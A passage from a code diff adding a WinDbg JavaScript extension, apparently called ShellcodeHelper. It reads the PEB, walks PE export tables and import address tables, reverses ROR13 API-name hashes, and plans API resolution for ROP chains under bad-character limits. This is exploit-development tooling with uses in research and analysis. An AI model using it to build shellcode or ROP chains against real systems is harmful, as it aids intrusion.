+        return lower === needle || lowerNoExt === noExt;
+      });
+    }
+    displayImportedSymbol(imported, nearest, expected, actual) {
+      if (!imported.name.startsWith("<")) {
+        return imported.name;
+      }
+      if (expected && actual && expected.name.toLowerCase() !== actual.name.toLowerCase()) {
+        return imported.name;
+      }
+      if (nearest && nearest.offset === BigInt(0)) {
+        return nearest.name;
+      }
+      if (nearest) {
+        return `${nearest.name}+0x${nearest.offset.toString(16).toUpperCase()}`;
+      }
+      return imported.name;
+    }
+    parseImportedName(owner, intValue) {
+      if (intValue === BigInt(0)) {
+        return { name: "<null>" };
+      }
+      const ordinalFlag = this.pointerSize === 8 ? BigInt("0x8000000000000000") : BigInt("0x80000000");
+      if ((intValue & ordinalFlag) !== BigInt(0)) {
+        return { name: "<ordinal>", ordinal: Number(intValue & BigInt(65535)) };
+      }
+      if (intValue < BigInt(256) || intValue >= owner.size) {
+        return {
+          name: "<invalid-name-rva>",
+          warning: `Thunk value 0x${intValue.toString(16).toUpperCase()} is not an import-name RVA.`
+        };
+      }
+      const byName = owner.base + intValue + BigInt(2);
+      try {
+        return { name: readAsciiString(byName, 512) };
+      } catch (error2) {
+        return {
+          name: "<unreadable-name>",
+          warning: formatError(error2)
+        };
+      }
+    }
+    readThunk(address) {
+      return this.pointerSize === 8 ? readPointer(address, 8) : BigInt(readUint32LE(address));
+    }
+  };
+  var ShellcodeHelper = class {
+    constructor() {
+      this.pointerSize = getPointerSize();
+      this.parser = new PEParser(this.pointerSize);
+      this.exportResolver = new ExportResolver(this.parser);
+      this.hashResolver = new HashResolver();
+      this.iatResolver = new IATResolver(this.pointerSize, this.parser, this.exportResolver, () => this.readModules());
+    }
+    peb() {
+      const pebAddress = this.getPebAddress();
+      if (!pebAddress) {
+        return this.errorRows("Unable to resolve PEB in current context.");
+      }
+      try {
+        const ldrOffset = this.pointerSize === 8 ? 24 : 12;
+        const processParametersOffset = this.pointerSize === 8 ? 32 : 16;
+        const imageBaseOffset = this.pointerSize === 8 ? 16 : 8;
+        const ldr = readPointer(pebAddress + BigInt(ldrOffset), this.pointerSize);
+        const processParameters = readPointer(pebAddress + BigInt(processParametersOffset), this.pointerSize);
+        const imageBase = readPointer(pebAddress + BigInt(imageBaseOffset), this.pointerSize);
+        const beingDebugged = readMemory(pebAddress + BigInt(2), 1)[0] !== 0;
+        return [
+          { Field: "PEB", Value: toDmlAddress(pebAddress, "db") },
+          { Field: "Ldr", Value: toDmlAddress(ldr, "db") },
+          { Field: "ProcessParameters", Value: toDmlAddress(processParameters, "db") },
+          { Field: "BeingDebugged", Value: beingDebugged ? "true" : "false" },
+          { Field: "ImageBase", Value: toDmlAddress(imageBase, "db") }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    modules() {
+      return this.readModules().map((module) => ({
+        Base: toDmlAddress(module.base, "db"),
+        End: toDmlAddress(module.end, "db"),
+        Size: `0x${module.size.toString(16).toUpperCase()}`,
+        Name: module.name,
+        Path: module.path
+      }));
+    }
+    modulePages(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const pageSize = BigInt(4096);
+      const pages = lookup.module.size === BigInt(0) ? BigInt(0) : (lookup.module.size + pageSize - BigInt(1)) / pageSize;
+      return [
+        {
+          Module: lookup.module.name,
+          Base: toDmlAddress(lookup.module.base, "db"),
+          End: toDmlAddress(lookup.module.end, "db"),
+          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
+          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
+          Pages: pages.toString()
+        }
+      ];
+    }
+    pageSummary(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const summary = this.collectPageProtections(lookup.module);
+      const pageSize = BigInt(4096);
+      const totalPages = Array.from(summary.values()).reduce((sum, count) => sum + count, 0);
+      const executablePages = Array.from(summary.entries()).reduce((sum, [protect, count]) => {
+        return sum + (this.isExecutableProtect(protect) ? count : 0);
+      }, 0);
+      const rows = [
+        {
+          Module: lookup.module.name,
+          Base: toDmlAddress(lookup.module.base, "db"),
+          End: toDmlAddress(lookup.module.end, "db"),
+          Size: `0x${lookup.module.size.toString(16).toUpperCase()}`,
+          PageSize: `0x${pageSize.toString(16).toUpperCase()}`,
+          TotalPages: totalPages.toString(),
+          ExecutablePages: executablePages.toString()
+        },
+        {
+          Protect: "TOTAL",
+          Name: "TOTAL",
+          Pages: totalPages.toString(),
+          ExecutablePages: executablePages.toString()
+        },
+        ...[...summary.entries()].sort((left, right) => left[0] - right[0]).map(([protect, count]) => {
+          const decoded = decodeProtectValue(protect);
+          return {
+            Protect: `0x${protect.toString(16).toUpperCase().padStart(2, "0")}`,
+            Name: decoded.name,
+            Pages: count.toString(),
+            Executable: decoded.executable ? "yes" : "no",
+            Writable: decoded.writable ? "yes" : "no"
+          };
+        })
+      ];
+      return rows;
+    }
+    base(name) {
+      const lookup = this.findModule(name);
+      if (lookup.kind === "ok") {
+        return [{ Module: lookup.module.name, Base: toDmlAddress(lookup.module.base, "db") }];
+      }
+      if (lookup.kind === "ambiguous") {
+        return this.moduleCandidatesRows(lookup.candidates);
+      }
+      return this.errorRows(`No module matches "${name}".`);
+    }
+    pe(name) {
+      const lookup = this.findModule(name);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        return this.parser.formatHeaderRows(lookup.module);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exports(name, filter) {
+      const lookup = this.findModule(name);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const rows = this.exportResolver.enumerate(lookup.module, filter);
+        if (rows.length === 0) {
+          return this.errorRows("No exports matched the requested filter.");
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    resolve(moduleName, symbol) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const entry = this.exportResolver.resolve(lookup.module, symbol);
+      if (!entry) {
+        return this.errorRows(`Symbol "${symbol}" was not found in ${lookup.module.name}.`);
+      }
+      return [
+        {
+          Module: lookup.module.name,
+          Symbol: `${entry.name} (${lookup.module.name}!${entry.name})`,
+          Address: toDmlAddress(entry.va, "u")
+        }
+      ];
+    }
+    hashes(moduleName, algorithm) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const exportsList = this.exportResolver.getExports(lookup.module);
+        const rows = this.hashResolver.compute(exportsList, algorithm);
+        if (rows.length === 0) {
+          return this.errorRows("No named exports were found to hash.");
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    hashresolve(moduleName, hashValue, algorithm = "ROR13") {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const parsed = parseHashValue(hashValue);
+      if (parsed === void 0) {
+        return this.errorRows(`Invalid hash value "${String(hashValue)}".`);
+      }
+      try {
+        for (const entry of this.exportResolver.getExports(lookup.module)) {
+          if (!entry.name) {
+            continue;
+          }
+          const hashHex = this.hashResolver.hashValue(entry.name, algorithm).Hash;
+          const computed = parseInt(hashHex.replace(/^0x/i, ""), 16) >>> 0;
+          if (computed === parsed) {
+            const forward = this.exportResolver.isForwarded(lookup.module, entry);
+            return [
+              {
+                Module: lookup.module.name,
+                Algorithm: String(this.hashResolver.hashValue(entry.name, algorithm).Algorithm),
+                Hash: `0x${parsed.toString(16).toUpperCase().padStart(8, "0")}`,
+                Symbol: entry.name,
+                Address: toDmlAddress(entry.va, "u"),
+                Forwarded: forward.forwarded ? "true" : "false",
+                ForwardTo: forward.target || ""
+              }
+            ];
+          }
+        }
+        return this.errorRows(`No symbol matched hash 0x${parsed.toString(16).toUpperCase().padStart(8, "0")}.`);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportdir(moduleName) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const info2 = this.exportResolver.getExportDirectory(lookup.module);
+        if (!info2) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        return [
+          { Field: "Module", Value: lookup.module.name },
+          { Field: "Base", Value: toDmlAddress(lookup.module.base, "db") },
+          { Field: "Export RVA", Value: `0x${info2.exportDirectoryRva.toString(16).toUpperCase()}` },
+          { Field: "Export VA", Value: toDmlAddress(info2.exportDirectoryVa, "db") },
+          { Field: "AddressOfNames", Value: `0x${info2.addressOfNamesRva.toString(16).toUpperCase()}` },
+          { Field: "NumberOfFunctions", Value: info2.numberOfFunctions.toString() },
+          { Field: "NumberOfNames", Value: info2.numberOfNames.toString() },
+          { Field: "AddressOfFunctions", Value: `0x${info2.addressOfFunctionsRva.toString(16).toUpperCase()}` },
+          { Field: "AddressOfNameOrdinals", Value: `0x${info2.addressOfNameOrdinalsRva.toString(16).toUpperCase()}` }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    export(moduleName, symbol) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const requested = symbol == null ? void 0 : symbol.trim();
+      if (!requested) {
+        return this.errorRows(`Symbol is required. Use sc.exports("${lookup.module.name}") to list exported functions.`);
+      }
+      try {
+        const entry = this.exportResolver.resolve(lookup.module, requested);
+        if (!entry) {
+          return this.errorRows(`Symbol "${requested}" was not found in ${lookup.module.name}.`);
+        }
+        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
+        if (!exportDir) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        const namesVa = lookup.module.base + BigInt(exportDir.addressOfNamesRva);
+        const ordinalsVa = lookup.module.base + BigInt(exportDir.addressOfNameOrdinalsRva);
+        let nameRva = 0;
+        let ordinalIndex = entry.ordinal - exportDir.ordinalBase;
+        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
+          const candidateNameRva = readUint32LE(namesVa + BigInt(i * 4));
+          const candidateOrdinal = readUint16LE(ordinalsVa + BigInt(i * 2));
+          const candidate = readAsciiString(lookup.module.base + BigInt(candidateNameRva), 512);
+          if (candidate.toLowerCase() === entry.name.toLowerCase()) {
+            nameRva = candidateNameRva;
+            ordinalIndex = candidateOrdinal;
+            break;
+          }
+        }
+        const forward = this.exportResolver.isForwarded(lookup.module, entry);
+        return [
+          { Property: "Name", Value: entry.name || "<unnamed>" },
+          { Property: "Name RVA", Value: `0x${nameRva.toString(16).toUpperCase()}` },
+          { Property: "Name VA", Value: toDmlAddress(lookup.module.base + BigInt(nameRva), "db") },
+          { Property: "Ordinal Index", Value: ordinalIndex.toString() },
+          { Property: "Ordinal", Value: entry.ordinal.toString() },
+          { Property: "Function RVA", Value: `0x${entry.rva.toString(16).toUpperCase()}` },
+          { Property: "Function VA", Value: toDmlAddress(entry.va, "u") },
+          { Property: "Forwarded", Value: forward.forwarded ? "true" : "false" },
+          { Property: "ForwardTo", Value: forward.target || "" }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportat(moduleName, ordinalIndex) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const entry = this.exportResolver.findByOrdinalIndex(lookup.module, ordinalIndex);
+        if (!entry) {
+          return this.errorRows(`Ordinal index ${ordinalIndex} not found in ${lookup.module.name}.`);
+        }
+        const forward = this.exportResolver.isForwarded(lookup.module, entry);
+        return [
+          {
+            Module: lookup.module.name,
+            OrdinalIndex: ordinalIndex.toString(),
+            Ordinal: entry.ordinal.toString(),
+            Name: entry.name || "<unnamed>",
+            RVA: `0x${entry.rva.toString(16).toUpperCase()}`,
+            VA: toDmlAddress(entry.va, "u"),
+            Forwarded: forward.forwarded ? "true" : "false",
+            ForwardTo: forward.target || ""
+          }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    exportwalk(moduleName, symbol = "GetProcAddress", verbose = false) {
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const headers = this.parser.parseHeaders(lookup.module);
+        const exportDir = this.exportResolver.getExportDirectory(lookup.module);
+        if (!exportDir) {
+          return this.errorRows(`Module ${lookup.module.name} has no export directory.`);
+        }
+        const namesVa = lookup.module.base + BigInt(exportDir.addressOfNamesRva);
+        const ordinalsVa = lookup.module.base + BigInt(exportDir.addressOfNameOrdinalsRva);
+        const functionsVa = lookup.module.base + BigInt(exportDir.addressOfFunctionsRva);
+        const rows = [];
+        let matchIndex = -1;
+        let matchName = "";
+        let ordinalIndex = -1;
+        let functionRva = 0;
+        for (let i = 0; i < exportDir.numberOfNames; i += 1) {
+          const nameRva = readUint32LE(namesVa + BigInt(i * 4));
+          const name = readAsciiString(lookup.module.base + BigInt(nameRva), 512);
+          if (verbose) {
+            rows.push({ Step: "Walk", Value: `${i}: ${name}` });
+          }
+          if (name.toLowerCase() === symbol.trim().toLowerCase()) {
+            matchIndex = i;
+            matchName = name;
+            ordinalIndex = readUint16LE(ordinalsVa + BigInt(i * 2));
+            functionRva = readUint32LE(functionsVa + BigInt(ordinalIndex * 4));
+            break;
+          }
+        }
+        const summary = [
+          { Step: "Resolving", Value: symbol },
+          { Step: "[1] Module base", Value: toDmlAddress(lookup.module.base, "db") },
+          { Step: "[2] DOS header", Value: toDmlAddress(headers.dosHeader, "db") },
+          { Step: "[3] DOS.e_lfanew", Value: `0x${headers.eLfanew.toString(16).toUpperCase()}` },
+          { Step: "[4] NT header", Value: toDmlAddress(headers.ntHeader, "db") },
+          { Step: "[5] Export directory", Value: toDmlAddress(exportDir.exportDirectoryVa, "db") },
+          { Step: "[6] AddressOfNames", Value: toDmlAddress(namesVa, "db") },
+          { Step: "[7] AddressOfNameOrdinals", Value: toDmlAddress(ordinalsVa, "db") },
+          { Step: "[8] AddressOfFunctions", Value: toDmlAddress(functionsVa, "db") }
+        ];
+        if (matchIndex < 0) {
+          summary.push({ Step: "[9] Match", Value: "not found" });
+          return summary.concat(verbose ? rows : []);
+        }
+        const finalVa = lookup.module.base + BigInt(functionRva);
+        const matchedEntry = this.exportResolver.resolve(lookup.module, matchName);
+        const forward = matchedEntry ? this.exportResolver.isForwarded(lookup.module, matchedEntry) : { forwarded: false, target: "" };
+        summary.push(
+          { Step: "[9] Match index", Value: `${matchIndex}: ${matchName}` },
+          { Step: "[10] Ordinal index", Value: ordinalIndex.toString() },
+          { Step: "[11] Function RVA", Value: `0x${functionRva.toString(16).toUpperCase()}` },
+          { Step: "[12] Final VA", Value: toDmlAddress(finalVa, "u") },
+          { Step: "[13] Forwarded", Value: forward.forwarded ? `true (${forward.target})` : "false" }
+        );
+        return summary.concat(verbose ? rows : []);
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    hash(name, algorithm = "ROR13") {
+      const input = name.trim();
+      if (!input) {
+        return this.errorRows("Input string is required.");
+      }
+      try {
+        return [this.hashResolver.hashValue(input, algorithm)];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    algorithms() {
+      return this.hashResolver.listAlgorithms();
+    }
+    iat(moduleName, filter) {
+      const lookup = moduleName ? this.findModule(moduleName) : this.findMainModule();
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      try {
+        const needle = filter == null ? void 0 : filter.trim().toLowerCase();
+        const rows = this.iatResolver.enumerateIat(lookup.module).filter((entry) => {
+          if (!needle) return true;
+          return entry.symbol.toLowerCase().includes(needle) || entry.importDll.toLowerCase().includes(needle);
+        }).map((entry) => {
+          var _a;
+          return {
+            Owner: toDmlModule(entry.ownerModule),
+            DLL: toDmlModule(entry.importDll),
+            Symbol: toDmlSymbol(entry.importDll, entry.symbol),
+            Ordinal: entry.ordinal ? entry.ordinal.toString() : "",
+            Slot: toDmlAddress(entry.slot, "dps"),
+            Target: toDmlAddress(entry.target, "u"),
+            Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
+            "Symbol+Offset": entry.nearest ? toDmlText(`${entry.nearest.name}+0x${entry.nearest.offset.toString(16).toUpperCase()}`, `u ${formatAddress(entry.target, this.pointerSize)}`) : "",
+            Status: entry.status,
+            Note: (_a = entry.nameWarning) != null ? _a : ""
+          };
+        });
+        if (rows.length === 0) {
+          return this.errorRows(filter ? `No IAT entries in ${lookup.module.name} matched "${filter}".` : `No IAT entries found for ${lookup.module.name}.`);
+        }
+        return rows;
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    iat_find(symbol) {
+      var _a;
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return this.errorRows("Symbol substring is required.");
+      }
+      const rows = [];
+      for (const module of this.readModules()) {
+        try {
+          const entries = this.iatResolver.enumerateIat(module);
+          for (const entry of entries) {
+            if (entry.symbol.toLowerCase().includes(needle)) {
+              rows.push({
+                Owner: toDmlModule(entry.ownerModule),
+                DLL: toDmlModule(entry.importDll),
+                Symbol: toDmlSymbol(entry.importDll, entry.symbol),
+                Slot: toDmlAddress(entry.slot, "dps"),
+                Target: toDmlAddress(entry.target, "u"),
+                Module: entry.actualModule ? toDmlModule(entry.actualModule.name) : "unknown",
+                Status: entry.status,
+                Note: (_a = entry.nameWarning) != null ? _a : ""
+              });
+            }
+          }
+        } catch (_error) {
+        }
+      }
+      if (rows.length === 0) {
+        return this.errorRows(`No IAT entries matched "${symbol}".`);
+      }
+      return rows;
+    }
+    iat_ptr(moduleName, symbol) {
+      var _a;
+      const lookup = this.findModule(moduleName);
+      if (lookup.kind !== "ok") {
+        return this.lookupFailureRows(lookup);
+      }
+      const needle = symbol.trim().toLowerCase();
+      if (!needle) {
+        return this.errorRows("Symbol is required.");
+      }
+      try {
+        const match = this.iatResolver.enumerateIat(lookup.module).find((entry) => entry.symbol.toLowerCase() === needle || entry.symbol.toLowerCase().includes(needle));
+        if (!match) {
+          return this.errorRows(`No IAT slot found for "${symbol}" in ${lookup.module.name}.`);
+        }
+        return [
+          {
+            slot: toDmlAddress(match.slot, "dps"),
+            target: toDmlAddress(match.target, "u"),
+            module: match.actualModule ? toDmlModule(match.actualModule.name) : "unknown",
+            symbol: toDmlSymbol(match.importDll, match.symbol),
+            status: match.status,
+            note: (_a = match.nameWarning) != null ? _a : ""
+          }
+        ];
+      } catch (error2) {
+        return this.errorRows(formatError(error2));
+      }
+    }
+    /** Capture a read-only, stopped-debugger snapshot for rop.api_plan. */
+    apiPlan(targetSpec, badchars = []) {
+      const parsed = parseApiSpec(targetSpec);
+      if (!parsed) return { candidates: [], error: 'Target must be "Symbol" or "MODULE!Symbol".' };
+      try {
+        const modules = this.readModules();
+        const targetModules = parsed.module ? modules.filter((module) => moduleNameMatches(module.name, parsed.module)) : modules.filter((module) => this.exportResolver.resolve(module, parsed.symbol) !== void 0);
+        if (targetModules.length === 0) return { candidates: [], error: `No loaded export matches ${targetSpec}.` };
+        if (targetModules.length > 1) {
+          return { candidates: [], error: `Target ${parsed.symbol} is exported by multiple modules; specify MODULE!${parsed.symbol}.` };
+        }
+        const targetModule = targetModules[0];
+        const targetExport = this.exportResolver.resolve(targetModule, parsed.symbol);
+        if (!targetExport) return { candidates: [], error: `No export ${parsed.symbol} in ${targetModule.name}.` };
+        const forward = this.exportResolver.isForwarded(targetModule, targetExport);
+        if (forward.forwarded) {
+          return { candidates: [], error: `${targetModule.name}!${parsed.symbol} is forwarded to ${forward.target}; forwarded target resolution is not yet implemented.` };
+        }
+        const headers = this.parser.parseHeaders(targetModule);
+        const imports = modules.flatMap((owner) => {
+          try {
+            const ownerHeaders = this.parser.parseHeaders(owner);
+            return this.iatResolver.enumerateIat(owner).map((entry) => {
+              var _a, _b, _c, _d;
+              return {
+                ownerModule: owner.name,
+                ownerBase: owner.base,
+                ownerImageBase: ownerHeaders.imageBase,
+                slot: entry.slot,
+                pointer: entry.target,
+                actualModule: (_a = entry.actualModule) == null ? void 0 : _a.name,
+                actualModuleBase: (_b = entry.actualModule) == null ? void 0 : _b.base,
+                importedSymbol: entry.symbol,
+                nearestSymbol: (_c = entry.nearest) == null ? void 0 : _c.name,
+                nearestOffset: (_d = entry.nearest) == null ? void 0 : _d.offset
+              };
+            });
+          } catch (_error) {
+            return [];
+          }
+        });
+        const target = { module: targetModule.name, symbol: targetExport.name, address: targetExport.va, exportRva: targetExport.rva };
+        return {
+          target,
+          candidates: planApiResolution(target, imports, badchars),
+          targetIdentity: {
+            name: targetModule.name,
+            path: targetModule.path,
+            base: targetModule.base,
+            imageBase: headers.imageBase,
+            sizeOfImage: headers.sizeOfImage,
+            timeDateStamp: headers.timeDateStamp,
+            hash: "not-collected"
+          }
+        };
+      } catch (error2) {
+        return { candidates: [], error: formatError(error2) };
+      }
+    }
+    findModule(name) {
+      const needle = normalizeNeedle(name);
+      if (!needle) {
+        return { kind: "not_found", name };
+      }
+      const modules = this.readModules();
+      const scored = modules.map((module) => {
+        const basename = module.name.toLowerCase();
+        const basenameNoExt = basename.endsWith(".dll") ? basename.slice(0, -4) : basename;
+        const fullPath = module.path.toLowerCase();
+        if (basename === needle || basenameNoExt === needle) {
+          return { module, score: 0 };
+        }
+        if (basename.startsWith(needle) || basenameNoExt.startsWith(needle)) {
+          return { module, score: 1 };
+        }
+        if (basename.includes(needle) || basenameNoExt.includes(needle)) {
+          return { module, score: 2 };
+        }
+        if (fullPath.includes(needle)) {
+          return { module, score: 3 };
+        }
+        return void 0;
+      }).filter((entry) => entry !== void 0);
+      if (scored.length === 0) {
+        return { kind: "not_found", name };
+      }
+      const bestScore = Math.min(...scored.map((entry) => entry.score));
+      const candidates2 = scored.filter((entry) => entry.score === bestScore).map((entry) => entry.module).sort((a, b) => a.base < b.base ? -1 : 1);
+      if (candidates2.length === 1) {
+        return { kind: "ok", module: candidates2[0] };
+      }
+      return { kind: "ambiguous", candidates: candidates2 };
+    }
+    findMainModule() {
+      var _a, _b, _c, _d, _e, _f;
+      const modules = this.readModules();
+      if (modules.length === 0) {
+        return { kind: "not_found", name: "<main-executable>" };
+      }
+      const process = host;
+      const executablePath = ((_d = (_c = (_a = process.currentProcess) == null ? void 0 : _a.ExecutablePath) != null ? _c : (_b = process.currentProcess) == null ? void 0 : _b.Path) != null ? _d : "").toLowerCase();
+      const processName = ((_f = (_e = process.currentProcess) == null ? void 0 : _e.Name) != null ? _f : "").toLowerCase();
+      if (executablePath) {
+        const byPath = modules.find((module) => module.path.toLowerCase() === executablePath);
+        if (byPath) {
+          return { kind: "ok", module: byPath };
+        }
+      }
+      if (processName) {
+        const normalized = processName.endsWith(".exe") ? processName : `${processName}.exe`;
+        const byName = modules.find((module) => module.name.toLowerCase() === normalized);
+        if (byName) {
+          return { kind: "ok", module: byName };
+        }
+      }
+      return { kind: "ok", module: modules[0] };
+    }
+    getPebAddress() {
+      var _a, _b, _c, _d, _e, _f, _g;
+      const hostAny = host;
+      const fromPseudo = tryToBigInt((_e = (_d = (_c = (_b = (_a = hostAny.namespace) == null ? void 0 : _a.Debugger) == null ? void 0 : _b.State) == null ? void 0 : _c.PseudoRegisters) == null ? void 0 : _d.General) == null ? void 0 : _e.peb);
+      if (fromPseudo && fromPseudo !== BigInt(0)) {
+        return fromPseudo;
+      }
+      const fromProcess = tryToBigInt((_g = (_f = hostAny.currentProcess) == null ? void 0 : _f.Environment) == null ? void 0 : _g.EnvironmentBlock);
+      if (fromProcess && fromProcess !== BigInt(0)) {
+        return fromProcess;
+      }
+      return void 0;
+    }
+    readModules() {
+      var _a;
+      const hostAny = host;
+      const source = (_a = hostAny.currentProcess) == null ? void 0 : _a.Modules;
+      const items = toArray2(source);
+      return items.map((entry) => {
+        var _a2, _b, _c, _d, _e, _f;
+        const moduleAny = entry;
+        const rawName = (_a2 = moduleAny.Name) != null ? _a2 : "<unknown>";
+        const path = (_b = moduleAny.Path) != null ? _b : rawName;
+        const name = moduleBasename(rawName);
+        const base = (_e = tryToBigInt((_d = (_c = moduleAny.BaseAddress) != null ? _c : moduleAny.Base) != null ? _d : moduleAny.Address)) != null ? _e : BigInt(0);
+        let end = tryToBigInt(moduleAny.EndAddress);
+        const sizeFromModule = tryToBigInt((_f = moduleAny.Size) != null ? _f : moduleAny.Length);
+        if (!end && sizeFromModule && sizeFromModule > BigInt(0)) {
+          end = base + sizeFromModule;
+        }
+        if (!end) {
+          end = base;
+        }
+        const size = end > base ? end - base : BigInt(0);
+        return {
+          name,
+          path,
+          base,
+          end,
+          size
+        };
+      }).filter((module) => module.base !== BigInt(0)).sort((a, b) => a.base < b.base ? -1 : 1);
+    }
+    collectPageProtections(module) {
+      var _a;
+      const counts = /* @__PURE__ */ new Map();
+      const pageSize = BigInt(4096);
+      for (let page = module.base; page < module.end; page += pageSize) {
+        const protect = this.readPageProtection(page);
+        counts.set(protect, ((_a = counts.get(protect)) != null ? _a : 0) + 1);
+      }
+      return counts;
+    }
+    readPageProtection(address) {
+      const output = executeDebuggerCommand(`!vprot ${formatAddress(address, this.pointerSize)}`);
+      const parsed = parseProtectFromVprot(output);
+      if (parsed !== void 0) {
+        return parsed;
+      }
+      throw new Error(`Unable to parse !vprot output for ${formatAddress(address, this.pointerSize)}.`);
+    }
+    isExecutableProtect(protect) {
+      return (protect & 255) === 16 || (protect & 255) === 32 || (protect & 255) === 64 || (protect & 255) === 128;
+    }
+    moduleCandidatesRows(candidates2) {
+      return candidates2.map((module) => ({
+        Base: toDmlAddress(module.base, "db"),
+        End: toDmlAddress(module.end, "db"),
+        Name: module.name,
+        Path: module.path
+      }));
+    }
+    lookupFailureRows(lookup) {
+      if (lookup.kind === "ambiguous") {
+        return this.moduleCandidatesRows(lookup.candidates);
+      }
+      if (lookup.kind === "not_found") {
+        return this.errorRows(`No module matches "${lookup.name}".`);
+      }
+      return this.errorRows(`Unexpected successful module lookup for "${lookup.module.name}".`);
+    }
+    errorRows(message) {
+      return [{ Error: message }];
+    }
+  };
+  function toArray2(value) {
+    if (Array.isArray(value)) {
+      return value;
+    }
+    if (value && typeof value[Symbol.iterator] === "function") {
+      try {
+        return Array.from(value);
+      } catch (_error) {
+        return [];
+      }
+    }
+    return [];
+  }
+  function tryToBigInt(value) {
+    var _a;
+    if (typeof value === "bigint") {
+      return value;
+    }
+    if (typeof value === "number" && Number.isFinite(value)) {
+      return BigInt(Math.max(0, Math.trunc(value)));
+    }
+    if (typeof value === "string") {
+      const text = value.trim();
+      if (/^0x[0-9a-f]+$/i.test(text)) {
+        return BigInt(text);
+      }
+      if (/^[0-9a-f]+$/i.test(text)) {
+        return BigInt(`0x${text}`);
+      }
+      if (/^[0-9]+$/.test(text)) {
+        return BigInt(text);
+      }
+      return void 0;
+    }
+    if (!value || typeof value !== "object") {
+      return void 0;
+    }
+    const addressed = value;
+    const fromAddress = tryToBigInt((_a = addressed.address) != null ? _a : addressed.Address);
+    if (fromAddress !== void 0) {
+      return fromAddress;
+    }
+    const valueOf = value.valueOf;
+    if (typeof valueOf === "function") {
+      const unwrapped = valueOf.call(value);
+      if (unwrapped !== value) {
+        const parsed = tryToBigInt(unwrapped);
+        if (parsed !== void 0) {
+          return parsed;
+        }
+      }
+    }
+    const asString = value.toString;
+    if (typeof asString === "function") {
+      return tryToBigInt(asString.call(value));
+    }
+    return void 0;
+  }
+  function readAsciiString(address, maxLength) {
+    const chars = [];
+    const chunkSize = 64;
+    for (let offset = 0; offset < maxLength; offset += chunkSize) {
+      const length = Math.min(chunkSize, maxLength - offset);
+      const bytes = tryReadMemory(address + BigInt(offset), length);
+      if (!bytes || bytes.length === 0) {
+        if (chars.length > 0) {
+          break;
+        }
+        throw new Error(`Unable to read ASCII string at 0x${address.toString(16).toUpperCase()}.`);
+      }
+      for (let i = 0; i < bytes.length; i += 1) {
+        const ch = bytes[i];
+        if (ch === 0) {
+          return chars.join("");
+        }
+        chars.push(String.fromCharCode(ch));
+      }
+    }
+    return chars.join("");
+  }
+  function toDmlAddress(address, command2) {
+    const hex6 = `0x${address.toString(16).toUpperCase()}`;
+    return `<link cmd="${command2} ${hex6}">${hex6}</link>`;
+  }
+  function toDmlModule(name) {
+    var _a;
+    const fileName = (_a = name.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
+    const moduleName = fileName.replace(/\.[^.]+$/, "");
+    if (!moduleName || !/^[A-Za-z0-9_.$?-]+$/.test(moduleName)) {
+      return name;
+    }
+    return toDmlText(name, `lmv m ${moduleName}`);
+  }
+  function toDmlSymbol(moduleName, symbol) {
+    var _a;
+    if (symbol === "<ordinal>" || !/^[A-Za-z0-9_?$@.]+$/.test(symbol)) {
+      return symbol;
+    }
+    const fileName = (_a = moduleName.replace(/\\/g, "/").split("/").pop()) != null ? _a : "";
+    const moduleToken = fileName.replace(/\.[^.]+$/, "");
+    if (!moduleToken || !/^[A-Za-z0-9_.$?-]+$/.test(moduleToken)) {
+      return symbol;
+    }
+    return toDmlText(symbol, `x ${moduleToken}!${symbol}`);
+  }
+  function toDmlText(label, command2) {
+    const escapedLabel = label.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+    return `<link cmd="${command2}">${escapedLabel}</link>`;
+  }
+  function machineToString(machine) {
+    switch (machine) {
+      case 332:
+        return "x86";
+      case 34404:
+        return "x64";
+      default:
+        return "unknown";
+    }
+  }
+  function normalizeNeedle(value) {
+    if (!value) {
